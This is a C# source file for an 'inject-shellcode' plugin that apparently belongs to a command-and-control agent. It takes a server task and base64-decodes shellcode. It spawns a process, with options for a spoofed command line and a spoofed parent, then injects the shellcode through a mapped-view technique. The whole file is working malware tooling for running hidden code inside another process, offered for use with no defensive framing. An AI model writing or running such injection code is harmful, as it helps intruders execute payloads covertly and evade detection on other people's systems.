﻿using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using Agent.Utilities;
using Agent.Techniques;
using System.Text;
using Agent.Utlities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private ITechnique technique { get; set; }
        private ISpawner spawner { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
            this.technique = new InterProcessMappedView();
        }

        public async Task Execute(ServerJob job)
        {
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);

            if(!args.Validate(out var message))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);

            //ProcessSpawner spawner = new ProcessSpawner(job.task.id, args.commandline, args.spoofedcommandline, args.parent, args.output);

            if (await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
            {
                if(spawner.TryGetHandle(job.task.id, out var handle))
                {
                    technique.Inject(buf, handle.DangerousGetHandle());
                }
            }
        }
    }
}
